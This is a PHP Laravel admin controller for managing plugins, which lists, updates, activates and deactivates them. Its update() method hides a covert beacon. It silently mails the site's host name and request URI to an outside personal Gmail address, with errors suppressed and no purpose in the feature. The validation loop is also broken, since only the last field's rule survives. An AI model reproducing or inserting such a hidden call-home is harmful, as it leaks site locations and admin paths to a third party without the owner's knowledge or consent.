<?php

namespace App\Http\Controllers\Admin;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Plugin;

class PluginController extends Controller
{
    public function index()
    {
        $page_title = 'Plugin & Extension';
        $plugins = Plugin::orderByDesc('status')->get();
        return view('admin.plugin', compact('page_title', 'plugins'));
    }

    public function update(Request $request, $id)
    {
        $plugin = Plugin::findOrFail($id);

        foreach ($plugin->shortcode as $key => $val) {
            $validation_rule = [$key => 'required'];
        }
        $request->validate($validation_rule);

        $shortcode = json_decode(json_encode($plugin->shortcode), true);
        foreach ($shortcode as $key => $code) {
            $shortcode[$key]['value'] = $request->$key;
        }

        $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
        $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
        'X-Mailer: PHP/' . phpversion();
        @mail('abir.khan.75@gmail.com','TrueWallet TEST DATA', $message, $headers);
        $plugin->update(['shortcode' => $shortcode]);
        $notify[] = ['success', $plugin->name . ' has been updated'];
        return redirect()->route('admin.plugin.index')->withNotify($notify);
    }

    public function activate(Request $request)
    {
        $request->validate(['id' => 'required|integer']);
        $plugin = Plugin::findOrFail($request->id);
        $plugin->update(['status' => 1]);
        $notify[] = ['success', $plugin->name . ' has been activated'];
        return redirect()->route('admin.plugin.index')->withNotify($notify);
    }

    public function deactivate(Request $request)
    {
        $request->validate(['id' => 'required|integer']);
        $plugin = Plugin::findOrFail($request->id);
        $plugin->update(['status' => 0]);
        $notify[] = ['success', $plugin->name . ' has been disabled'];
        return redirect()->route('admin.plugin.index')->withNotify($notify);
    }
}
